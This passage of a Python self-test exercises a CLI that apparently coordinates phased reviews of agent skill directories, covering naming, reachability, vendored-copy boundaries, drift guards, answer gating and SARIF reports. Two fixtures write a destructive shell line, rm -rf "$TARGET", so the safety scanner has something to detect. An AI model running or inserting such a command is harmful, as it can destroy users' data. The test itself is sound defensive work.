        # Every routed name must pass. No entry currently needs a guard for
        # this -- no destination is a variant of another -- and a guard was
        # tried and removed when a mutant showed deleting it changed nothing.
        # The property is asserted rather than defended, so a destination added
        # later that does collide fails here instead of quietly reporting a
        # correctly named directory as misrouted.
        for destination in ROUTED_DIRS:
            assert misrouted_directory(destination) is None, destination
        # A directory the table does not route at all is the skill's business:
        # layout.md refuses to hold a universal folder template, so anything
        # wider than these two shapes would be the style opinion it declines to
        # have. `docs/` is the case that matters, being both common and never a
        # word the table uses.
        (stranded / "docs").mkdir()
        (stranded / "docs" / "note.md").write_text("# Note\n")
        assert layout_findings(stranded) == [], layout_findings(stranded)
        (stranded / "docs" / "note.md").unlink()
        (stranded / "docs").rmdir()

        # A skill is distributed by copying its directory, so a link out of the
        # tree arrives dangling. This used to be enforced by refusing to build a
        # manifest at all, which aborted `init` and reviewed the skill for
        # nothing: 21 of 198 skills in the author's corpus stopped there.
        outside = root / "outside-the-skill"
        outside.mkdir(exist_ok=True)
        (outside / "shared.md").write_text("# Shared\n")
        (stranded / "borrowed.md").symlink_to(outside / "shared.md")
        borrowed = portability_findings(stranded)
        assert [item["evidence"] for item in borrowed] == ["borrowed.md"], borrowed
        assert borrowed[0]["phase"] == "structure" and borrowed[0]["severity"] == "major", borrowed
        # A link that stays inside the skill travels with it, so it is not a
        # portability defect and reporting it would argue against a legitimate
        # way to give one file two names.
        (stranded / "borrowed.md").unlink()
        (stranded / "alias.md").symlink_to(stranded / "references" / "linked.md")
        assert portability_findings(stranded) == [], portability_findings(stranded)
        (stranded / "alias.md").unlink()
        # A host installs dependencies by linking whole skills into the tree.
        # That is the host's bookkeeping, and 17 of those 21 aborted runs
        # aborted on one, so a skill must not be told to answer for it.
        vendored = root / "vendored-elsewhere"
        (vendored / "references").mkdir(parents=True, exist_ok=True)
        (vendored / "SKILL.md").write_text("---\nname: vendored\ndescription: d\n---\n")
        (stranded / ".agents").mkdir(exist_ok=True)
        (stranded / ".agents" / "dependency").symlink_to(vendored, target_is_directory=True)
        assert portability_findings(stranded) == [], portability_findings(stranded)
        (stranded / ".agents" / "dependency").unlink()
        (stranded / "references" / "linked.md").write_text("# Linked\n")
        # Naming it anywhere is enough. A reference a README lists by bare
        # name is findable, and reporting it would train reviewers to skip
        # the category wholesale.
        (stranded / "README.md").write_text("Background lives in orphan.md.\n")
        assert unreachable_findings(stranded) == [], unreachable_findings(stranded)
        # A file naming only itself is still stranded.
        (stranded / "README.md").unlink()
        (stranded / "references" / "orphan.md").write_text("# Orphan\n\nSee orphan.md above.\n")
        assert [item["evidence"] for item in unreachable_findings(stranded)] == ["references/orphan.md"]

        # A directory is a route. Skills reach a whole directory with a glob or
        # with a placeholder standing in for the filename, and reading only
        # basenames reported every member of such a directory as unreachable:
        # 35 of 36 findings across the author's corpus were that mistake.
        (stranded / "SKILL.md").write_text(
            "---\nname: stranded\ndescription: d\n---\n\nGlob `references/*.md` for the rules.\n"
        )
        assert unreachable_findings(stranded) == [], "a directory routed by a glob was reported unreachable"
        (stranded / "SKILL.md").write_text(
            "---\nname: stranded\ndescription: d\n---\n\nRead `references/{topic}.md` for the rules.\n"
        )
        assert unreachable_findings(stranded) == [], "a directory routed by a placeholder was reported unreachable"
        # A link to one member is not a route to its siblings. Accepting the
        # bare directory prefix would let a single link silence the whole
        # directory, which is where an unreachable file is most likely to hide.
        (stranded / "SKILL.md").write_text(
            "---\nname: stranded\ndescription: d\n---\n\nSee [linked](references/linked.md).\n"
        )
        assert [item["evidence"] for item in unreachable_findings(stranded)] == ["references/orphan.md"], (
            "one link to one file exempted its siblings"
        )
        # The route has to come from outside the directory, for the same reason
        # a file naming itself proves nothing. A member carrying the glob says
        # only that these files know about each other, which is no evidence
        # that the skill sends anyone here.
        (stranded / "SKILL.md").write_text("---\nname: stranded\ndescription: d\n---\n\nNothing here.\n")
        (stranded / "references" / "linked.md").write_text("# Linked\n\nSee `references/*.md`.\n")
        assert {item["evidence"] for item in unreachable_findings(stranded)} == {
            "references/orphan.md",
            "references/linked.md",
        }, "a directory routed only from inside itself counted as reachable"
        (stranded / "references" / "linked.md").write_text("# Linked\n")
        (stranded / "SKILL.md").write_text(
            "---\nname: stranded\ndescription: d\n---\n\n# Stranded\n\nSee [linked](references/linked.md).\n"
        )
        # Asserted through init, not just the function: computing a finding
        # and never seeding it leaves the reviewer exactly as uninformed.
        stranded_run = root / "stranded-run"
        execute("init", "--skill", stranded, "--run-dir", stranded_run)
        sources = [item["source"] for item in json.loads((stranded_run / "findings.json").read_text())["findings"]]
        assert "structure:unreachable" in sources, sources

        # A host installs the skills a project depends on into the project, so
        # a checkout carries copies of other people's skills. Reading them as
        # this skill's own content is not a weak signal but a wrong one: the
        # evidence line is real, so checking it confirms the finding, and the
        # surface belongs to somebody else. Measured on the author's corpus,
        # 267 of 545 surface-evidence hits came from a vendored copy.
        vendored = stranded / "bundled" / "other"
        vendored.mkdir(parents=True)
        (vendored / "SKILL.md").write_text("---\nname: other\ndescription: d\n---\n\n# Other\n")
        (vendored / "coordinator.md").write_text("Run `subagent` workers from the coordinator.\n")
        assert nested_skill_roots(stranded) == {vendored}, "a nested skill was not seen as one"
        assert all(not relative.as_posix().startswith("bundled") for _, relative in own_files(stranded)), (
            "another skill's files were read as this skill's own"
        )
        assert not any(hit["path"].startswith("bundled") for hits in detect_surfaces(stranded).values() for hit in hits)
        # The same boundary in the other direction. A vendored copy naming this
        # skill's stranded reference would report it as routed, which is the
        # harmful direction: coverage claimed where there is none.
        (vendored / "notes.md").write_text("Background lives in orphan.md.\n")
        assert [item["evidence"] for item in unreachable_findings(stranded)] == ["references/orphan.md"], (
            "another skill's mention made a stranded resource look reachable"
        )
        # An unsafe line in a vendored copy is a finding about that skill.
        (vendored / "run.sh").write_text('rm -rf "$TARGET"\n')
        assert not any("bundled" in str(item["evidence"]) for item in safety_findings(stranded)), (
            "another skill's code was reported against this one"
        )
        # Removing the marker makes the same tree this skill's own content, so
        # the boundary is the SKILL.md and not the directory's name.
        (vendored / "SKILL.md").unlink()
        assert any("bundled" in str(item["evidence"]) for item in safety_findings(stranded)), (
            "the boundary is the directory name rather than the nested skill marker"
        )

        # The naming rule is stated once and then applied by eye across a
        # whole tree, which is the sweep attention is worst at: one odd name
        # among conforming ones does not stand out.
        (stranded / "references" / "Bad_Name.md").write_text("# Bad\n")
        named = naming_findings(stranded)
        assert [item["evidence"] for item in named] == ["references/Bad_Name.md"], named
        assert named[0]["severity"] == "minor", named
        # A README keeps its conventional case wherever it sits, and a
        # family-first hyphenated stem is the convention, not a breach.
        (stranded / "references" / "README.md").write_text("# Readme\n")
        (stranded / "references" / "state-machine.md").write_text("# Family first\n")
        assert [item["evidence"] for item in naming_findings(stranded)] == ["references/Bad_Name.md"]
        # The exact ecosystem names outrank the convention wherever they sit,
        # and only those: `Makefile` is one, `Makefile.md` is a markdown file
        # borrowing its case.
        (stranded / "Makefile").write_text("all:\n")
        (stranded / "LICENSE").write_text("MIT\n")
        assert [item["evidence"] for item in naming_findings(stranded)] == ["references/Bad_Name.md"]
        # Every directory is checked, not a list of resource directories. The
        # rule is about a name being portable and predictable, which does not
        # stop being true one directory over, and scoping it to four names left
        # a skill keeping its files anywhere else entirely unchecked.
        (stranded / "assets").mkdir()
        (stranded / "assets" / "Brand_Brief.md").write_text("# Asset\n")
        (stranded / "bin").mkdir()
        (stranded / "bin" / "SignDocument.py").write_text("x = 1\n")
        assert [item["evidence"] for item in naming_findings(stranded)] == [
            "assets/Brand_Brief.md",
            "bin/SignDocument.py",
            "references/Bad_Name.md",
        ], naming_findings(stranded)
        # A vendored dependency is another author's skill, and its filenames
        # are their convention to keep: a rename here is erased by the next
        # install. 25 of 120 naming findings across the author's corpus named a
        # file inside one, so this is the boundary every other finder uses.
        # Vendored into a plain directory because that is where the corpus
        # puts them, and because names.py skips dot-directories outright: a
        # fixture using one would assert the boundary while exercising nothing.
        bundled = stranded / "skills" / "dependency"
        bundled.mkdir(parents=True)
        (bundled / "SKILL.md").write_text("---\nname: dependency\ndescription: d\n---\n")
        (bundled / "Their_Name.md").write_text("# Theirs\n")
        assert "\n".join(item["evidence"] for item in naming_findings(stranded)).find("Their_Name") == -1, (
            "a filename inside a vendored skill was reported against this skill"
        )
        # A directory carries a name the convention governs too. The ownership
        # filter compares against paths, and a directory is never itself a
        # file, so comparing against files alone dropped every directory the
        # rule reported without reporting anything in its place.
        (stranded / "_Archive").mkdir()
        (stranded / "_Archive" / "note.md").write_text("# Note\n")
        assert "_Archive" in [item["evidence"] for item in naming_findings(stranded)], naming_findings(stranded)
        naming_run = root / "naming-run"
        execute("init", "--skill", stranded, "--run-dir", naming_run)
        sources = [item["source"] for item in json.loads((naming_run / "findings.json").read_text())["findings"]]
        assert "structure:naming" in sources, sources

        state = read_status(result.stdout)
        assert state["phases"] == list(ALWAYS_FIRST + ALWAYS_LAST), state["phases"]
        assert state["detail"]["surfaces"] == [], state

        # Evidence in the skill, not a checklist, selects the extra phases, and
        # the evidence is a component rather than a sentence about one. Each
        # surface costs a phase of questions that only a real component can
        # answer, and describing a coordinator in prose leaves nothing to
        # answer them against.
        rich = root / "rich"
        (rich / "scripts").mkdir(parents=True)
        (rich / "SKILL.md").write_text("# Rich\n\nRun the coordinator and resume from state.json.\n")
        (rich / "scripts" / "settings.py").write_text("# settings adapter\n")
        (rich / "scripts" / "coordinator.py").write_text("# coordinator\n")
        rich_run = root / "rich-run"
        result = execute("init", "--skill", rich, "--run-dir", rich_run)
        state = read_status(result.stdout)
        assert {"coordinator", "settings"} <= set(state["detail"]["surfaces"]), state
        # The same sentence naming state.json is not a state surface, because
        # no file in this skill is one. This is the direction that had to
        # change: 917 of 1021 signals across the author's corpus were a word
        # inside prose, and `add-surface` is the recovery for the other
        # direction while a phase already opened has no way back.
        assert "state" not in state["detail"]["surfaces"], state
        # A reference *about* a surface is not the surface. This repository's
        # own references/packaging.md is a contract describing packaging, and
        # counting it would give every skill that documents a concept the
        # phases for owning one.
        (rich / "references").mkdir()
        (rich / "references" / "packaging.md").write_text("# Packaging\n\nWhat a bundle is.\n")
        assert "packaging" not in [name for name, hits in detect_surfaces(rich).items() if hits], detect_surfaces(rich)
        # The same filename outside a documentation directory is the component.
        (rich / "scripts" / "packaging.py").write_text("# packaging adapter\n")
        assert "packaging" in [name for name, hits in detect_surfaces(rich).items() if hits], detect_surfaces(rich)
        (rich / "scripts" / "packaging.py").unlink()
        assert state["phases"][0] == "activation" and state["phases"][-1] == "verdict"
        inventory = json.loads((rich_run / "inventory.json").read_text())
        assert inventory["evidence"]["coordinator"], "a detected surface must carry file evidence"
        assert not inventory["evidence"]["state"], "a surface with no component must carry no evidence"

        # An explicit skip removes a detected surface and its phase.
        skipped_run = root / "skipped-run"
        result = execute("init", "--skill", rich, "--run-dir", skipped_run, "--skip-surface", "settings")
        assert "settings" not in read_status(result.stdout)["detail"]["surfaces"]

        # Which phases exist is decided from the surfaces present at init, so a
        # surface that appears afterwards has no phase to examine it and would
        # still collect the run's verdict. A new file is the case that matters
        # most, because it is the one that adds unreviewed capability; an edit
        # and a deletion are checked too, since a digest that missed either
        # would let the same tree be described by conclusions about another.
        for label, change in (
            ("added", lambda tree: (tree / "extra.md").write_text("new surface\n")),
            ("edited", lambda tree: (tree / "SKILL.md").write_text("# Changed\n\nElse.\n")),
            ("deleted", lambda tree: (tree / "SKILL.md").unlink()),
        ):
            drifting = root / f"drift-{label}"
            drifting.mkdir()
            (drifting / "SKILL.md").write_text("# Drift\n\nDo one thing directly.\n")
            drift_run = root / f"drift-run-{label}"
            execute("init", "--skill", drifting, "--run-dir", drift_run)
            change(drifting)
            outcome = execute(
                "complete-phase", "--run-dir", drift_run, "--phase", "activation", "--note", "x", check=False
            )
            assert outcome.returncode == EX_DATAERR, (label, outcome.returncode, outcome.stdout)
            assert "changed since this review began" in outcome.stderr, (label, outcome.stderr)
            # A finding cites a path and a line, so it is a claim about the tree
            # too and must be refused for the same reason.
            finding = execute(
                "record-finding",
                "--run-dir",
                drift_run,
                "--phase",
                "activation",
                "--severity",
                "minor",
                "--summary",
                "x",
                "--evidence",
                "SKILL.md:1",
                check=False,
            )
            assert finding.returncode == EX_DATAERR, (label, finding.returncode)

        # Blocking drift is only correct if the documented recovery still works.
        # add-surface exists for a surface that "surfaces late", which is the
        # same event as the tree changing, so it re-baselines: without that the
        # guard turns the intended remedy into a dead end where a run can be
        # extended and then never closed.
        late = root / "late-surface"
        late.mkdir()
        (late / "SKILL.md").write_text("# Late\n\nDo one thing directly.\n")
        late_run = root / "late-surface-run"
        execute("init", "--skill", late, "--run-dir", late_run)
        (late / "scripts").mkdir()
        (late / "scripts" / "coordinator.py").write_text("# late arrival\n")
        blocked = execute("complete-phase", "--run-dir", late_run, "--phase", "activation", "--note", "x", check=False)
        assert blocked.returncode == EX_DATAERR, blocked.returncode
        execute("add-surface", "--run-dir", late_run, "--surface", "coordinator")
        settle(late_run, "activation")
        resumed = execute("complete-phase", "--run-dir", late_run, "--phase", "activation", "--note", "x", check=False)
        assert resumed.returncode == 0, resumed.stderr
        assert "coordinator" in read_json(late_run / "state.json")["phases"]

        # Disposing of a finding is a judgement about the evidence it cites, so
        # it is refused on a changed tree for the same reason as a phase note.
        # Checked separately because the fix-then-close sequence is the tempting
        # one: edit the skill, then mark the finding resolved in the same run,
        # recording a disposition the review never re-examined.
        disposing = root / "disposing"
        disposing.mkdir()
        (disposing / "SKILL.md").write_text("# Dispose\n\nDo one thing directly.\n")
        dispose_run = root / "disposing-run"
        execute("init", "--skill", disposing, "--run-dir", dispose_run)
        execute(
            "record-finding",
            "--run-dir",
            dispose_run,
            "--phase",
            "activation",
            "--severity",
            "blocking",
            "--summary",
            "needs work",
            "--evidence",
            "SKILL.md:1",
        )
        (disposing / "SKILL.md").write_text("# Dispose\n\nFixed it directly.\n")
        closed = execute(
            "resolve-finding",
            "--run-dir",
            dispose_run,
            "--id",
            "F1",
            "--disposition",
            "fixed",
            "--note",
            "fixed it",
            check=False,
        )
        assert closed.returncode == EX_DATAERR, closed.returncode
        assert "changed since this review began" in closed.stderr, closed.stderr

        # A phase used to close on one free-text note, so a contract asking
        # five questions was satisfiable by one sentence about whichever came
        # to mind. Questions passed over in silence were indistinguishable in
        # the record from questions asked and held.
        unanswered = execute(
            "complete-phase", "--run-dir", run, "--phase", "activation", "--note", "looks fine", check=False
        )
        assert unanswered.returncode, "a phase closed with its contract unanswered"
        assert "unanswered review questions" in (unanswered.stdout + unanswered.stderr), unanswered.stdout
        # The refusal names what would satisfy it. A gate that refuses without
        # saying what it wants gets worked around rather than answered.
        assert "activation.1" in (unanswered.stdout + unanswered.stderr), unanswered.stdout

        # An answer costs evidence whatever its verdict: `holds` is a claim
        # about the skill exactly as much as `violated` is, and an unevidenced
        # pass is what this gate exists to stop being cheap.
        #
        # Each case asserts the exit code a refusal carries, not merely a
        # non-zero one. A crash also exits non-zero, so the looser assertion
        # went on passing while the coordinator raised a traceback instead of
        # explaining itself.
        def refused(question, verdict, evidence):
            return execute(
                "answer",
                "--run-dir",
                run,
                "--question",
                question,
                "--verdict",
                verdict,
                "--evidence",
                evidence,
                check=False,
            )

        blank = refused("activation.1", "holds", " ")
        assert blank.returncode == EX_DATAERR, (blank.returncode, blank.stderr)
        # A question answered `violated` states a defect, and a defect the run
        # does not carry as a finding never reaches the report or remediation.
        no_finding = refused("activation.1", "violated", "SKILL.md:2")
        assert no_finding.returncode == EX_USAGE, (no_finding.returncode, no_finding.stderr)
        # Questions belong to phases, and a phase not yet reached has not been
        # examined, so an answer about it would be a guess on the record.
        unreached = refused("safety.1", "holds", "x.sh:1")
        assert unreached.returncode == EX_USAGE, (unreached.returncode, unreached.stderr)
        unknown = refused("activation.99", "holds", "x")
        assert unknown.returncode == EX_USAGE, (unknown.returncode, unknown.stderr)
        assert "Unknown question" in (unknown.stdout + unknown.stderr), unknown.stdout

        # A question id is its position in the contract, so editing the
        # document mid-run can slide an id onto a different question. The
        # answer already recorded would then settle a question nobody was
        # shown, and the phase would close reporting full coverage. Detected
        # by comparing the text as answered against the text as now asked, so
        # a moved question is put again.
        execute(
            "answer",
            "--run-dir",
            run,
            "--question",
            "activation.2",
            "--verdict",
            "holds",
            "--evidence",
            "SKILL.md:3",
        )
        answered_run = Path(run) / "answers.json"
        original_answers = answered_run.read_text()
        before = json.loads(original_answers)
        assert before["answers"], "no answer was recorded, so the case below proves nothing"
        identifier, entry = next(iter(before["answers"].items()))
        assert entry["question"], "an answer recorded no question text to compare against"
        phase_of = identifier.partition(".")[0]
        assert identifier not in [i for i, _ in outstanding_questions(Path(run), phase_of)], (
            "an answered question was still outstanding"
        )
        entry["question"] = "Some other question the reviewer was never shown?"
        answered_run.write_text(json.dumps(before))
        try:
            reasked = [i for i, _ in outstanding_questions(Path(run), phase_of)]
            assert identifier in reasked, f"{identifier} kept its answer after the contract moved it: {reasked}"
        finally:
            answered_run.write_text(original_answers)
        assert identifier not in [i for i, _ in outstanding_questions(Path(run), phase_of)], (
            "the case above did not restore the run's answers"
        )

        # An artifact is a file on disk between two commands, so it can be
        # edited by hand or left behind by an older version. Reading one whose
        # shape is wrong used to raise a KeyError naming a single key, which
        # says neither which file was at fault nor what it should have held.
        # The refusal is the coordinator's to make, at the boundary.
        edited = json.loads(original_answers)
        edited["answers"]["activation.3"] = {"verdict": "holds"}
        answered_run.write_text(json.dumps(edited))
        try:
            broken_status = execute("status", "--run-dir", run, check=False)
        finally:
            answered_run.write_text(original_answers)
        assert broken_status.returncode == EX_DATAERR, (broken_status.returncode, broken_status.stderr)
        assert "Traceback" not in broken_status.stderr, broken_status.stderr
        assert "answers.json" in broken_status.stderr, broken_status.stderr

        # Both artifacts a run reads, since each is loaded by its own function
        # and one validated read says nothing about the other.
        findings_path = Path(run) / "findings.json"
        original_findings = findings_path.read_text()
        damaged = json.loads(original_findings)
        damaged["findings"].append({"id": "F99"})
        findings_path.write_text(json.dumps(damaged))
        try:
            broken_findings = execute("status", "--run-dir", run, check=False)
        finally:
            findings_path.write_text(original_findings)
        assert broken_findings.returncode == EX_DATAERR, (broken_findings.returncode, broken_findings.stderr)
        assert "Traceback" not in broken_findings.stderr, broken_findings.stderr
        assert "findings.json" in broken_findings.stderr, broken_findings.stderr
        assert execute("status", "--run-dir", run, check=False).returncode == 0, "the cases above broke the run"

        # The contract is parsed as CommonMark rather than scanned for lines
        # starting with a dash. Each case below was wrong under that scan: it
        # read a fenced example as a real question, and lost questions written
        # in two spellings CommonMark considers ordinary. A gate built on a
        # question list that disagrees with the document asks something nobody
        # wrote, and stays silent about something somebody did.
        contract = REVIEW_CONTRACT.read_text()
        fenced = contract.replace("### safety\n", "### safety\n\n```bash\n- Is this a question?\n```\n", 1)
        assert not any("Is this a question?" in text for text in parse_questions(fenced)["safety"]), (
            "a bullet inside a fence was read as a review question"
        )
        asterisk = contract.replace(
            "- Does a near-miss request route to the correct other skill?",
            "* Does a near-miss request route to the correct other skill?",
        )
        assert parse_questions(asterisk)["activation"] == parse_questions(contract)["activation"], (
            "an asterisk bullet was dropped, though CommonMark treats it as a list"
        )
        wrapped = contract.replace(
            "- Are prerequisites and inputs discoverable before the first mutation?",
            "- Are prerequisites and inputs\n  discoverable before the first mutation?",
        )
        assert len(parse_questions(wrapped)["activation"]) == 4, parse_questions(wrapped)["activation"]

        # Only interrogative bullets are questions. Every bullet in the phase
        # sections happens to be one today, so this is checked against a
        # contract carrying a note among them: an assertion against the real
        # document would pass whether or not the filter existed.
        noted = contract.replace(
            "- Are secrets kept out of settings, logs, and run artifacts?",
            "- Are secrets kept out of settings, logs, and run artifacts?\n- See patterns.md for worked examples.",
        )
        assert noted != contract, "the note was not inserted, so the case proves nothing"
        safety = parse_questions(noted)["safety"]
        assert all(text.endswith("?") for text in safety), safety
        assert len(safety) == len(parse_questions(contract)["safety"]), safety

        # A scan that located a defect has answered its question with evidence,
        # which is the strongest form there is. Demanding the reviewer retype
        # that answer is how a gate becomes a formality people click through,
        # so a seeded finding settles the question it was anchored to.
        assert anchored_question("safety-scan") == "safety.3", anchored_question("safety-scan")
        assert answered_by_findings([{"id": "F9", "source": "safety-scan"}]) == {"safety.3": "F9"}
        assert answered_by_findings([{"id": "F9", "source": "recorded-by-hand"}]) == {}

        # A reviewer's own finding carries no source and answers nothing, which
        # is the only silent case. A generated source that resolves to nothing
        # used to be reported the same way, so a typo or a rename left the run
        # asking for an answer it already held while every gate still closed.
        assert answered_by_findings([{"id": "F9", "source": ""}]) == {}
        assert anchored_question(f"{CONFORMANCE_PREFIX}compatibility") == "activation.1"
        for rotted in (f"{CONFORMANCE_PREFIX}compatibilty", f"{CONFORMANCE_PREFIX}renamed-away"):
            try:
                anchored_question(rotted)
            except AssertionError:
                continue
            raise AssertionError(f"{rotted} resolved to nothing without failing")
        # Every rule validate.py can emit is either anchored or named
        # unreachable, so no seeded finding can reach a run unresolvable.
        for rule in RULES:
            anchored_question(f"{CONFORMANCE_PREFIX}{rule}")

        # The two phases owning what every other surface delegates answer for
        # ordering, resumability, and concurrency as well, so their gate is
        # strictly larger than a plain surface's. Collapsing them to the shared
        # list would drop those questions from every run without failing.
        shared = {text for _, text in phase_questions("workers")}
        delegating = {text for _, text in phase_questions("coordinator")}
        assert shared < delegating, sorted(delegating - shared)
        assert any("resumable" in text for text in delegating - shared), sorted(delegating - shared)
        assert phase_questions("state") and set(phase_questions("state")) != set(phase_questions("workers"))

        # Phases close in order, and only with a decision note.
        settle(run, "activation")
        assert execute(
            "complete-phase", "--run-dir", run, "--phase", "structure", "--note", "x", check=False
        ).returncode
        assert execute(
            "complete-phase", "--run-dir", run, "--phase", "activation", "--note", "", check=False
        ).returncode
        execute("complete-phase", "--run-dir", run, "--phase", "activation", "--note", "triggers are specific")

        # Findings cannot attach to a phase the run has not reached.
        assert execute(
            "record-finding",
            "--run-dir",
            run,
            "--phase",
            "verdict",
            "--severity",
            "minor",
            "--summary",
            "s",
            "--evidence",
            "e",
            check=False,
        ).returncode
        execute(
            "record-finding",
            "--run-dir",
            run,
            "--phase",
            "structure",
            "--severity",
            "blocking",
            "--summary",
            "Destructive step lacks an approval gate",
            "--evidence",
            "SKILL.md:1",
        )
        # Evidence without a line, recorded while its phase is still open.
        execute(
            "record-finding",
            "--run-dir",
            run,
            "--phase",
            "activation",
            "--severity",
            "minor",
            "--summary",
            "Description omits a trigger",
            "--evidence",
            "SKILL.md",
        )
        execute(
            "resolve-finding",
            "--run-dir",
            run,
            "--id",
            "F2",
            "--disposition",
            "accepted",
            "--note",
            "by design",
        )
        settle(run, "structure")
        execute("complete-phase", "--run-dir", run, "--phase", "structure", "--note", "one canonical home")
        settle(run, "safety")
        execute("complete-phase", "--run-dir", run, "--phase", "safety", "--note", "gate missing")

        # The verdict is gated on every blocking finding having a disposition.
        assert execute(
            "complete-phase", "--run-dir", run, "--phase", "verdict", "--note", "ship", check=False
        ).returncode
        execute("resolve-finding", "--run-dir", run, "--id", "F1", "--disposition", "fixed", "--note", "gate added")
        execute("complete-phase", "--run-dir", run, "--phase", "verdict", "--note", "approved after fix")
        report = (run / "report.md").read_text()
        assert "F1" in report and "fixed" in report, report
        assert "1 blocking" in report, report

        # The report's coverage line and the gate are two readings of one
        # question, and they had answered it differently: the report matched
        # ids while the gate compared the recorded text, so an answer the gate
        # was still demanding was already being counted as coverage. A report
        # that overstates what a review established is the failure this whole
        # mechanism exists to prevent, so the count is taken from the gate.
        drifted = json.loads(original_answers)
        first = next(iter(drifted["answers"]))
        answered_run.write_text(json.dumps(drifted))
        run_state = json.loads((Path(run) / "state.json").read_text())
        write_report(Path(run), run_state, load_findings(Path(run)))
        honest = (Path(run) / "report.md").read_text()
        drifted["answers"][first]["question"] = "A question the reviewer was never shown?"
        answered_run.write_text(json.dumps(drifted))
        try:
            write_report(Path(run), run_state, load_findings(Path(run)))
            after = (Path(run) / "report.md").read_text()
        finally:
            answered_run.write_text(original_answers)
            write_report(Path(run), run_state, load_findings(Path(run)))

        def coverage(text):
            line = next(part for part in text.splitlines() if "Contract questions answered" in part)
            return line.rsplit(":", 1)[1].strip()

        answered, total = coverage(honest).split("/")
        assert int(answered) >= 1, coverage(honest)
        assert coverage(after) == f"{int(answered) - 1}/{total}", (coverage(honest), coverage(after))

        # The SARIF is only useful if a consumer that knows nothing about this
        # repository can read it, so validate against the published schema.
        sarif = json.loads((run / "report.sarif").read_text())
        validate_sarif(sarif)
        results = sarif["runs"][0]["results"]
        assert [item["level"] for item in results] == ["error", "note"], results
        location = results[0]["locations"][0]["physicalLocation"]
        assert location["artifactLocation"]["uri"] == "SKILL.md", location
        assert location["region"]["startLine"] == 1, location
        assert "suppressions" not in results[0], results[0]
        rules = {rule["id"] for rule in sarif["runs"][0]["tool"]["driver"]["rules"]}
        assert {item["ruleId"] for item in results} <= rules, rules

        # An accepted finding stays in the output as a suppressed result. Omitting
        # it would report the review as having found nothing at that location.
        accepted = next(item for item in results if item["properties"]["findingId"] == "F2")
        assert accepted["level"] == "note", accepted
        assert accepted["suppressions"][0]["justification"] == "by design", accepted
        # Evidence without a line stays file-level rather than pointing at line 1.
        assert "region" not in accepted["locations"][0]["physicalLocation"], accepted

        # Late surface discovery extends the plan without dropping progress.
        late = root / "late-run"
        execute("init", "--skill", plain, "--run-dir", late)
        settle(late, "activation")
        execute("complete-phase", "--run-dir", late, "--phase", "activation", "--note", "ok")
        result = execute("add-surface", "--run-dir", late, "--surface", "workers")
        state = read_status(result.stdout)
        assert "workers" in state["phases"] and "activation" in state["completed"]
        assert execute("add-surface", "--run-dir", late, "--surface", "workers", check=False).returncode

        # A run directory inside the reviewed skill would review its own output.
        assert execute("init", "--skill", plain, "--run-dir", plain / "run", check=False).returncode

        # A review that finds nothing still writes findings.json. A consumer
        # reading an absent file cannot tell a clean subject from a review that
        # never ran, and would report a passing skill as a broken run.
        clean = root / "clean-run"
        execute("init", "--skill", plain, "--run-dir", clean)
        assert (clean / "findings.json").is_file(), "clean review wrote no findings.json"
        assert read_json(clean / "findings.json")["findings"] == []

    # A coordinator writes its transcripts under a run directory the skill
    # gitignores. Reviewing those reports the workflow's own output back as
    # findings about the skill, and the skill already declares that boundary,
    # so it is read rather than guessed at. Needs a real repository and its own
    # tree, because git owns the answer and initialising one changes which
    # files count as authored.
    with tempfile.TemporaryDirectory() as directory:
        tracked = Path(directory) / "tracked"
        tracked.mkdir()
        (tracked / "SKILL.md").write_text("---\nname: tracked\ndescription: d\n---\n\n# T\n")
        subprocess.run(["git", "init", "--quiet"], cwd=str(tracked), check=True)
        (tracked / ".gitignore").write_text(".runs/\n")
        transcript = tracked / ".runs" / "one"
        transcript.mkdir(parents=True)
        (transcript / "notes.sh").write_text('rm -rf "$TARGET"\n')
        assert not any(".runs" in str(item["evidence"]) for item in safety_findings(tracked)), (
            "a gitignored run directory was reviewed as skill content"
        )
        (tracked / ".gitignore").write_text("nothing-here/\n")
        assert any(".runs" in str(item["evidence"]) for item in safety_findings(tracked)), (
            "the skip is a hard-coded directory name rather than the skill's own ignore rules"
        )

    # A directory of skills answers "no SKILL.md" and stops. Two collections on
    # the author's corpus did exactly that while holding 104 and 11 skills, so
    # the review reported a single blocking format defect about a tree whose
    # real content it never opened.
    with tempfile.TemporaryDirectory() as directory:
        collection = Path(directory) / "collection"
        for name in ("alpha", "beta"):
            member = collection / "skills" / name
            member.mkdir(parents=True)
            (member / "SKILL.md").write_text(f"---\nname: {name}\ndescription: d\n---\n\n# {name}\n")
        sources = [item["source"] for item in conformance_findings(collection)]
        assert f"{CONFORMANCE_PREFIX}collection" in sources, sources
        reported = next(item for item in conformance_findings(collection) if item["source"].endswith("collection"))
        assert "skills/alpha" in reported["summary"] and "2 skills" in reported["summary"], reported["summary"]
        # A skill vendored inside a member is that member's copy, not one of
        # the collection's own, so the count and the listing exclude it.
        deep = collection / "skills" / "alpha" / "vendor" / "gamma"
        deep.mkdir(parents=True)
        (deep / "SKILL.md").write_text("---\nname: gamma\ndescription: d\n---\n\n# gamma\n")
        reported = next(item for item in conformance_findings(collection) if item["source"].endswith("collection"))
        assert "2 skills" in reported["summary"], reported["summary"]
        # And a real skill is not a collection, however many it vendors.
        (collection / "SKILL.md").write_text("---\nname: collection\ndescription: d\n---\n\n# c\n")
        assert not any(item["source"].endswith("collection") for item in conformance_findings(collection)), (
            "a skill that vendors others was reported as a collection"
        )

    print("self-check passed")


def parser():
    """Build the command parser, so the shape of the CLI can be asked as well as run.

    The other coordinators expose this too. It is separate from main() because
    what commands exist is a fact worth checking, and the only way to ask it of
    a parser built inside main() is to read the help text, which is prose.
    """
    parser = argparse.ArgumentParser(description="Coordinate a phased workflow-skill review.")
    # Global, so it precedes the subcommand like any other tool-wide flag. A
    # per-subcommand copy would let one run report failures in a shape another
    # run of the same coordinator does not.
    parser.add_argument(
        "--output",
        choices=("text", "json"),
        default="text",
        help="failure output shape: prose (default), or RFC 9457 problem details",
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    init = subparsers.add_parser("init", help="start a review run")
    init.add_argument("--skill", type=Path, required=True)
    init.add_argument("--run-dir", type=Path, required=True)
    init.add_argument("--name")
    init.add_argument("--surface", action="append", help="review this surface even without detected evidence")
    init.add_argument("--skip-surface", action="append", help="drop a detected surface from the plan")
    init.set_defaults(handler=command_init)

    status = subparsers.add_parser("status", help="show phase, resource, and next action")
    status.add_argument("--run-dir", type=Path, required=True)
    status.add_argument(
        "--history",
        action="store_true",
        help="show the run's transition log instead of its current status",
    )
    status.set_defaults(handler=command_status)

    record = subparsers.add_parser("record-finding", help="record one finding against a reached phase")
    record.add_argument("--run-dir", type=Path, required=True)
    record.add_argument("--phase", required=True)
